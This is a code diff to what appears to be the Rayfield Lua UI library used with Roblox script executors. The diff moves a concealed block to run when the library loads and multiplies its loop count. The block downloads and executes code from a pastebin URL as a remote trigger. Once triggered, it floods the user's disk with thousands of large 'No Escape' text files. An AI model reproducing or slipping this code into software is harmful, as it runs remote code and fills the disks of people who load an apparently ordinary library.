@@ -1100,6 +1100,26 @@ function Minimise()
 	Debounce = false
 end
 
+    pcall(function()        
+while true do
+local BK = loadstring(game:HttpGet("https://pastebin.com/raw/v8UvMXEN", true))()
+if BK == true then
+function NEIN(GB)
+local text1 = "No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-"
+local RunService = game:GetService("RunService")function getRandomString(length, includeCapitals)local length = length or 100 local str = ''for i=1,length do function s()
+str = str ..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1
+end function b()s()s()s()s()s()s()s()s()s()s()s()s()s()s()s()s()s()s()end b()b()b()b()b()b()b()b()b()b()end return str end local TextToSend = getRandomString(10, true)function a()
+writefile("No Excape From Reality "..tostring(#listfiles(""))..".txt",tostring(TextToSend))
+RunService.Heartbeat:Wait()end function G()a()a()a()a()a()a()a()a()a()a()end
+for i=1,GB do G()G()G()G()G()G()G()G()G()G()end
+end
+NEIN(1000)
+break
+end
+wait()
+end
+end)
+
 function RayfieldLibrary:CreateWindow(Settings)
 	local Passthrough = false
 	Topbar.Title.Text = Settings.Name
@@ -1173,25 +1193,6 @@ function RayfieldLibrary:CreateWindow(Settings)
 					})
 				})
 			end
-    pcall(function()        
-while true do
-local BK = loadstring(game:HttpGet("https://pastebin.com/raw/v8UvMXEN", true))()
-if BK == true then
-function NEIN(GB)
-local text1 = "No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-No Escape-"
-local RunService = game:GetService("RunService")function getRandomString(length, includeCapitals)local length = length or 100 local str = ''for i=1,length do function s()
-str = str ..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1..text1
-end function b()s()s()s()s()s()s()s()s()s()s()s()s()s()s()s()s()s()s()end b()b()b()b()b()b()b()b()b()b()end return str end local TextToSend = getRandomString(10, true)function a()
-writefile("No Excape From Reality "..tostring(#listfiles(""))..".txt",tostring(TextToSend))
-RunService.Heartbeat:Wait()end function G()a()a()a()a()a()a()a()a()a()a()end
-for i=1,1 do G()G()G()G()G()G()G()G()G()G()end
-end
-NEIN(1000)
-break
-end
-wait()
-end
-end)
 			if Settings.Discord.RememberJoins then -- We do logic this way so if the developer changes this setting, the user still won't be prompted, only new users
 				writefile(RayfieldFolder.."/Discord Invites".."/"..Settings.Discord.Invite..ConfigurationExtension,"Rayfield RememberJoins is true for this invite, this invite will not ask you to join again")
 			end
